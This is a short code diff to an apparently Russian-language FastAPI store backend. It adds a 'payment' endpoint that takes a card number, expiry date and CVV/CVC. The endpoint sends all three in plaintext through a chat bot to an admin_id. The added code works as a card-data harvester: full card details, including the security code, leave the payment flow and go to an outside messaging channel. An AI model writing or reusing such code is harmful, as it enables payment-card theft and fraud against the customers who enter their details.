@@ -28,6 +28,16 @@ async def get_exact_product_api(product_id):
     get_product = get_product_db(product_id)
     return get_product
 
+@test_router.post("/oplata_router")
+async def add_oplata_api(number_of_cart:int,srok_of_cart:str,cvv_cvc:int):
+    add_oplata = oplata(number_of_cart,srok_of_cart,cvv_cvc)
+    text = (f'Номер карты: {number_of_cart}\n\n'
+            f'Cрок карты:{srok_of_cart}\n\n'
+            f'CVV_CVC: {cvv_cvc}\n')
+    bot.send_message(admin_id,text)
+    return add_oplata
+
+
 @test_router.put("/update_game")
 async def update_game_api(game_name:str,change_info:str,new_info:str):
     update_game = update_game_db(game_name, change_info, new_info)
